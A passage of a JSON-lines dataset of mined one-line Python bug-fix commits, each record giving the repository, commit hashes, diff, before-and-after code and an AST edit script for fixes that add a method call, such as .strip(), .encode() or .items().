'_meta' ] [ 'hostvars' ] [ k ] [ 'name' ] == self . args . host : match = k break", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 13, 6, 26], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 25, 3, 60], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:items\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ansible-1", "commit_sha": "91ea8e5eaf6ec2a57be0fc241c18717af8488c58", "parent_sha": "4e0666fc4affeabef376f710fbb1e210a93d436d", "file_path": "lib/ansible/modules/system/firewalld.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -527,7 +527,7 @@ def main():\n     source = module.params['source']\n \n     if module.params['port'] is not None:\n-        port, protocol = module.params['port'].split('/')\n+        port, protocol = module.params['port'].strip().split('/')\n         if protocol is None:\n             module.fail_json(msg='improper port format (missing protocol?)')\n     else:\n", "before": "port , protocol = module . params [ 'port' ] . split ( '/' )", "after": "port , protocol = module . params [ 'port' ] . strip ( ) . split ( '/' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 26, 3, 53], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 26, 3, 53], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 26, 3, 47], 0], [\"Move\", \"N1\", [\".:.\", 3, 47, 3, 48], 1], [\"Insert\", \"N1\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "comunidad", "commit_sha": "f53ad71ebd8da2ae6a03b58a2fec48f399de560f", "parent_sha": "0eb8ddf792784ed92cb1ce6abfcbd8703016f867", "file_path": "stock_inventory_import/wizard/import_inventory.py", "project_url": "https://github.com/vmcloudsolution/comunidad", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class ImportInventory(models.TransientModel):\n         if 'lot' in values and values['lot']:\n             val['lot'] = values['lot']\n         val['code'] = values['codigo']\n-        val['quantity'] = values['cantidad']\n+        val['quantity'] = values['cantidad'].strip()\n         val['location_id'] = prod_location\n         val['inventory_id'] = inventory.id\n         val['fail'] = True\n", "before": "val [ 'quantity' ] = values [ 'cantidad' ]", "after": "val [ 'quantity' ] = values [ 'cantidad' ] . strip ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 45], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 27, 3, 45], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "moto", "commit_sha": "89e46d87bdc4e1e1b6a8e0e8fd992a4369cf2a49", "parent_sha": "b2af81eab5b00b894a9a7e135866d1eaabaa76d7", "file_path": "moto/kinesis/models.py", "project_url": "https://github.com/kidomine/moto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ class Stream(object):\n                 raise InvalidArgumentError(\"explicit_hash_key\")\n \n         else:\n-            key = int(md5(partition_key).hexdigest(), 16)\n+            key = int(md5(partition_key.encode('utf-8')).hexdigest(), 16)\n \n         for shard in self.shards.values():\n             if shard.starting_hash <= key < shard.ending_hash:\n", "before": "else : key = int ( md5 ( partition_key ) . hexdigest ( ) , 16 )", "after": "else : key = int ( md5 ( partition_key . encode ( 'utf-8' ) ) . hexdigest ( ) , 16 )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 41], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 26, 3, 41], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:partition_key\", 3, 27, 3, 40], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 40, 3, 41], 2]]"}
{"project": "pritunl", "commit_sha": "2a8eed10937e2c5bfae57fd1252f9ffd78f1b0d2", "parent_sha": "03ff08b3fc210a0e445bb54edaec951f21fcf73f", "file_path": "pritunl/sso/radius.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ def verify_radius(username, password):\n     resp = radius.authenticate(\n         username.encode(),\n         password.encode(),\n-        settings.app.sso_secret,\n+        settings.app.sso_secret.encode(),\n         host=host,\n         port=port,\n     )\n", "before": "resp = radius . authenticate ( username . encode ( ) , password . encode ( ) , settings . app . sso_secret , host = host , port = port , )", "after": "resp = radius . authenticate ( username . encode ( ) , password . encode ( ) , settings . app . sso_secret . encode ( ) , host = host , port = port , )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 31, 6, 6], [\"call\", \"N0\"], 5], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 9, 3, 32], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "moto", "commit_sha": "324d17fd25f17e6bac24fdb80ca994a7e234f0f7", "parent_sha": "b0d5eaf0c634353d9827c5091ff6d49cf927ae83", "file_path": "moto/iam/responses.py", "project_url": "https://github.com/kidomine/moto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -407,7 +407,7 @@ class IamResponse(BaseResponse):\n         return template.render(\n             user_name=user_name,\n             policy_name=policy_name,\n-            policy_document=policy_document\n+            policy_document=policy_document.get('policy_document')\n         )\n \n     def list_user_policies(self):\n", "before": "return template . render ( user_name = user_name , policy_name = policy_name , policy_document = policy_document )", "after": "return template . render ( user_name = user_name , policy_name = policy_name , policy_document = policy_document . get ( 'policy_document' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 13, 3, 44], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:policy_document\", 3, 29, 3, 44], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'policy_document'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "3c292434508a40244a487faac193f6afb3d92b97", "parent_sha": "320062e40e9e01265fbdeab07acff484183284e7", "file_path": "pritunl/user/user.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1147,7 +1147,7 @@ class User(mongo.MongoObject):\n         else:\n             raise ValueError('Unknown hash version')\n \n-        test_hash = base64.b64encode(hash_func(pin_salt, test_pin))\n+        test_hash = base64.b64encode(hash_func(pin_salt, test_pin)).decode()\n         return test_hash == pin_hash\n \n     def set_pin(self, pin):\n", "before": "test_hash = base64 . b64encode ( hash_func ( pin_salt , test_pin ) )", "after": "test_hash = base64 . b64encode ( hash_func ( pin_salt , test_pin ) ) . decode ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 68], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 68], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 68], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "pritunl", "commit_sha": "621b068ca39b8c1fc6d8a2ca4a8ca45089b95d7a", "parent_sha": "ed1d20ab5be7644c6f3fd34cb4a8c5d6e08a9578", "file_path": "pritunl/auth/administrator.py", "project_url": "https://github.com/security-geeks/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -425,7 +425,7 @@ def check_session(csrf_check):\n \n         auth_test_signature = base64.b64encode(hmac.new(\n             administrator.secret.encode(), auth_string.encode(),\n-            hashlib.sha256).digest())\n+            hashlib.sha256).digest()).decode()\n         if not utils.const_compare(auth_signature, auth_test_signature):\n             return False\n \n", "before": "auth_test_signature = base64 . b64encode ( hmac . new ( administrator . secret . encode ( ) , auth_string . encode ( ) , hashlib . sha256 ) . digest ( ) )", "after": "auth_test_signature = base64 . b64encode ( hmac . new ( administrator . secret . encode ( ) , auth_string . encode ( ) , hashlib . sha256 ) . digest ( ) ) . decode ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 1, 31, 3, 38], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 1, 31, 3, 38], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 1, 31, 3, 38], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "sensor-rp", "commit_sha": "25ef5c8c377bd565e1ea7267af42bffa253bc6fc", "parent_sha": "54a84ea03deab1a6d8d793186db8ad282c3812cd", "file_path": "sensor_modules/pimoroni_as7262.py", "project_url": "https://github.com/chad-ermacora/sensor-rp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ class CreateAS7262:\n \n     def __init__(self):\n         try:\n-            self.as7262_import = __import__('as7262')\n+            self.as7262_import = __import__('as7262').AS7262()\n             self.as7262_import.soft_reset()\n             self.as7262_import.set_gain(64)\n             self.as7262_import.set_integration_time(21)\n", "before": "self . as7262_import = __import__ ( 'as7262' )", "after": "self . as7262_import = __import__ ( 'as7262' ) . AS7262 ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 34, 3, 54], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 34, 3, 54], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 34, 3, 54], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:AS7262\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "evo-1", "commit_sha": "b389a56ed9fba2a09e094c99bdc2d7ff57c79860", "parent_sha": "b08741143241f3a2218d67fbde49a2f416dd0da3", "file_path": "evo/tools/plot.py", "project_url": "https://github.com/ToniRV/evo-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -422,7 +422,7 @@ def trajectories(fig, trajectories, plot_mode=PlotMode.xy, title=\"\", subplot_arg\n     if isinstance(trajectories, trajectory.PosePath3D):\n         draw(trajectories)\n     elif isinstance(trajectories, dict):\n-        for name, t in trajectories:\n+        for name, t in trajectories.items():\n             draw(t, name)\n     else:\n         for t in trajectories:\n", "before": "for name , t in trajectories : draw ( t , name )", "after": "for name , t in trajectories . items ( ) : draw ( t , name )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 4, 26], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:trajectories\", 3, 24, 3, 36], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:items\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ansible-1", "commit_sha": "be9d7df6c41a91614e551733db0bf51f6fdbc300", "parent_sha": "9377c3f525d06fd2dd09df153d0b57e7bc08ef6b", "file_path": "lib/ansible/utils.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -141,7 +141,7 @@ def check_conditional(conditional):\n         return not var.startswith(\"$\")\n     def is_unset(var):\n         return var.startswith(\"$\")\n-    return eval(conditional)\n+    return eval(conditional.replace(\"\\n\", \"\\\\n\"))\n \n def is_executable(path):\n     '''is the given path executable?'''\n", "before": "return eval ( conditional )", "after": "return eval ( conditional . replace ( \"\\n\" , \"\\\\n\" ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 16, 3, 29], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 16, 3, 29], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:conditional\", 3, 17, 3, 28], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"\\\\n\\\"\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:\\\"\\\\\\\\n\\\"\", \"T\"], 3], [\"Move\", \"N2\", [\"):)\", 3, 28, 3, 29], 4]]"}
{"project": "ansible-1", "commit_sha": "174de1161bf576cacfc3133e0d19902f77d91c09", "parent_sha": "7c10c16251d09fcdd99c5ee9364fb0796e3b3a25", "file_path": "test/units/playbook/test_play_context.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -142,7 +142,7 @@ class TestPlayContext(unittest.TestCase):\n         self.assertEqual(cmd, \"\"\"%s -c '%s %s -u %s %s -c '\"'\"'echo %s; %s'\"'\"''\"\"\" % (default_exe, sudo_exe, sudo_flags, play_context.become_user, default_exe, play_context.success_key, default_cmd))\n         play_context.become_pass = 'testpass'\n         cmd = play_context.make_become_cmd(cmd=default_cmd, executable=default_exe)\n-        self.assertEqual(cmd, \"\"\"%s -c '%s %s -p \"%s\" -u %s %s -c '\"'\"'echo %s; %s'\"'\"''\"\"\" % (default_exe, sudo_exe, sudo_flags, play_context.prompt, play_context.become_user, default_exe, play_context.success_key, default_cmd))\n+        self.assertEqual(cmd, \"\"\"%s -c '%s %s -p \"%s\" -u %s %s -c '\"'\"'echo %s; %s'\"'\"''\"\"\" % (default_exe, sudo_exe, sudo_flags.replace('-n',''), play_context.prompt, play_context.become_user, default_exe, play_context.success_key, default_cmd))\n \n         play_context.become_pass = None\n \n", "before": "self . assertEqual ( cmd , \"\"\"%s -c '%s %s -p \"%s\" -u %s %s -c '\"'\"'echo %s; %s'\"'\"''\"\"\" % ( default_exe , sudo_exe , sudo_flags , play_context . prompt , play_context . become_user , default_exe , play_context . success_key , default_cmd ) )", "after": "self . assertEqual ( cmd , \"\"\"%s -c '%s %s -p \"%s\" -u %s %s -c '\"'\"'echo %s; %s'\"'\"''\"\"\" % ( default_exe , sudo_exe , sudo_flags . replace ( '-n' , '' ) , play_context . prompt , play_context . become_user , default_exe , play_context . success_key , default_cmd ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"tuple\", 3, 95, 3, 229], [\"call\", \"N0\"], 5], [\"Insert\", [\"tuple\", 3, 95, 3, 229], [\",:,\", \"T\"], 6], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:sudo_flags\", 3, 119, 3, 129], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'-n'\", \"T\"], 1], [\"Move\", \"N2\", [\",:,\", 3, 129, 3, 130], 2], [\"Insert\", \"N2\", [\"string:''\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "ansible-1", "commit_sha": "130139dc80c7b4353c9a4383c1e69dcd87a4f2d5", "parent_sha": "4a8d1703d4d1522abafc52b643e249e8a830007f", "file_path": "lib/ansible/template/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -310,7 +310,7 @@ class Templar:\n                                 return C.DEFAULT_NULL_REPRESENTATION\n \n                     # Using a cache in order to prevent template calls with already templated variables\n-                    sha1_hash = sha1(variable + str(preserve_trailing_newlines) + str(escape_backslashes) + str(fail_on_undefined) + str(overrides)).hexdigest()\n+                    sha1_hash = sha1(variable.encode('utf-8') + str(preserve_trailing_newlines) + str(escape_backslashes) + str(fail_on_undefined) + str(overrides)).hexdigest()\n                     if sha1_hash in self._cached_result:\n                         result = self._cached_result[sha1_hash]\n                     else:\n", "before": "sha1_hash = sha1 ( variable + str ( preserve_trailing_newlines ) + str ( escape_backslashes ) + str ( fail_on_undefined ) + str ( overrides ) ) . hexdigest ( )", "after": "sha1_hash = sha1 ( variable . encode ( 'utf-8' ) + str ( preserve_trailing_newlines ) + str ( escape_backslashes ) + str ( fail_on_undefined ) + str ( overrides ) ) . hexdigest ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 38, 3, 80], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:variable\", 3, 38, 3, 46], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "56880b76bbf652930569059d3babea95bbe0ef8f", "parent_sha": "346bb611c72088f9439f81f0a078f961d0c65b6c", "file_path": "lib/ansible/runner/action_plugins/pause.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -101,7 +101,7 @@ class ActionModule(object):\n                 # Clear out any unflushed buffered input which would\n                 # otherwise be consumed by raw_input() prematurely.\n                 tcflush(sys.stdin, TCIFLUSH)\n-                self.result['user_input'] = raw_input(self.prompt)\n+                self.result['user_input'] = raw_input(self.prompt.encode(sys.stdout.encoding))\n         except KeyboardInterrupt:\n             while True:\n                 print '\\nAction? (a)bort/(c)ontinue: '\n", "before": "self . result [ 'user_input' ] = raw_input ( self . prompt )", "after": "self . result [ 'user_input' ] = raw_input ( self . prompt . encode ( sys . stdout . encoding ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 54, 3, 67], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 54, 3, 67], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 55, 3, 66], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 66, 3, 67], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:encoding\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:sys\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:stdout\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "c948af3b1ee3ebb943ff75c6f37cec6067c642f2", "parent_sha": "601a1cc6d918c9f1e332bd3406a658de7fcaa08e", "file_path": "lib/ansible/plugins/action/synchronize.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class ActionModule(ActionBase):\n         # connection to the remote host\n         if 'ansible_syslog_facility' in task_vars:\n             del task_vars['ansible_syslog_facility']\n-        for key in task_vars:\n+        for key in task_vars.keys():\n             if key.startswith(\"ansible_\") and key.endswith(\"_interpreter\"):\n                 del task_vars[key]\n \n", "before": "for key in task_vars : if key . startswith ( \"ansible_\" ) and key . endswith ( \"_interpreter\" ) : del task_vars [ key ]", "after": "for key in task_vars . keys ( ) : if key . startswith ( \"ansible_\" ) and key . endswith ( \"_interpreter\" ) : del task_vars [ key ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 5, 35], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:task_vars\", 3, 20, 3, 29], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:keys\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ansible-1", "commit_sha": "21f5bc4242b2244c0d7911b8a72ab828b4cb162f", "parent_sha": "776fc044ddf1d2c686782495ed34990ec8793ca4", "file_path": "lib/ansible/utils/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -410,7 +410,7 @@ def md5s(data):\n \n     buf = StringIO.StringIO(data)\n     digest = _md5()\n-    digest.update(buf.read())\n+    digest.update(buf.read().encode('utf-8'))\n     return digest.hexdigest()\n \n def md5(filename):\n", "before": "digest . update ( buf . read ( ) )", "after": "digest . update ( buf . read ( ) . encode ( 'utf-8' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 19, 3, 29], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 19, 3, 29], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 19, 3, 29], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "ansible-1", "commit_sha": "409bfe4d0f1effa307b83898818ac9e78fb9443f", "parent_sha": "30e59998126e8255365009e36400e4c7e3abffe8", "file_path": "lib/ansible/module_utils/basic.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1400,7 +1400,7 @@ class AnsibleModule(object):\n         # Return a jsonified string.  Sometimes the controller turns a json\n         # string into a dict/list so transform it back into json here\n         if isinstance(value, (unicode, bytes)):\n-            return value\n+            return value.strip()\n         else:\n             if isinstance(value (list, tuple, dict)):\n                 return json.dumps(value)\n", "before": "return value", "after": "return value . strip ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 13, 3, 25], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:value\", 3, 20, 3, 25], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ansible-1", "commit_sha": "3f4ac0b9f774ade3cae66e46ac6ce1e23727706e", "parent_sha": "25aa757e80b98b2226756b2e165c67f28c92462a", "file_path": "lib/ansible/module_utils/shell.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -176,7 +176,7 @@ class Shell(object):\n     def sanitize(self, cmd, resp):\n         cleaned = []\n         for line in resp.splitlines():\n-            if line.startswith(str(cmd)) or self.find_prompt(line):\n+            if line.lstrip().startswith(str(cmd)) or self.find_prompt(line):\n                 continue\n             cleaned.append(line)\n         return \"\\n\".join(cleaned)\n", "before": "if line . startswith ( str ( cmd ) ) or self . find_prompt ( line ) : continue", "after": "if line . lstrip ( ) . startswith ( str ( cmd ) ) or self . find_prompt ( line ) : continue", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 16, 3, 31], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 16, 3, 31], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:line\", 3, 16, 3, 20], 0], [\"Move\", \"N1\", [\".:.\", 3, 20, 3, 21], 1], [\"Insert\", \"N1\", [\"identifier:lstrip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ansible-1", "commit_sha": "a7371d49982b92b964c284615750181cb08b67d0", "parent_sha": "e1297af18a2e9b13899f512af853a9792e79041e", "file_path": "test/runner/lib/cloud/__init__.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -350,7 +350,7 @@ class CloudProvider(CloudBase):\n                 os.environ['SHIPPABLE_JOB_NUMBER'],\n             )\n \n-        node = re.sub(r'[^a-zA-Z0-9]+', '-', platform.node().split('.')[0])\n+        node = re.sub(r'[^a-zA-Z0-9]+', '-', platform.node().split('.')[0]).lower()\n \n         return 'ansible-test-%s-%d' % (node, random.randint(10000000, 99999999))\n \n", "before": "node = re . sub ( r'[^a-zA-Z0-9]+' , '-' , platform . node ( ) . split ( '.' ) [ 0 ] )", "after": "node = re . sub ( r'[^a-zA-Z0-9]+' , '-' , platform . node ( ) . split ( '.' ) [ 0 ] ) . lower ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 76], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 76], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 76], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:lower\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "python-oauth10a", "commit_sha": "5b3c8ca86fdce5fe94f9e9a0c585ed2c54cab081", "parent_sha": "ab76195dc36c1c03ef1f1abed9c452a253fd8f19", "file_path": "oauth2/__init__.py", "project_url": "https://github.com/TimSC/python-oauth10a", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -325,7 +325,7 @@ class Request(dict):\n         # tell urlencode to deal with sequence values and map them correctly\n         # to resulting querystring. for example self[\"k\"] = [\"v1\", \"v2\"] will\n         # result in 'k=v1&k=v2' and not k=%5B%27v1%27%2C+%27v2%27%5D\n-        return urllib.urlencode(self, True)\n+        return urllib.urlencode(self, True).replace('+', '%20')\n  \n     def to_url(self):\n         \"\"\"Serialize as a URL for a GET request.\"\"\"\n", "before": "return urllib . urlencode ( self , True )", "after": "return urllib . urlencode ( self , True ) . replace ( '+' , '%20' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 44], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 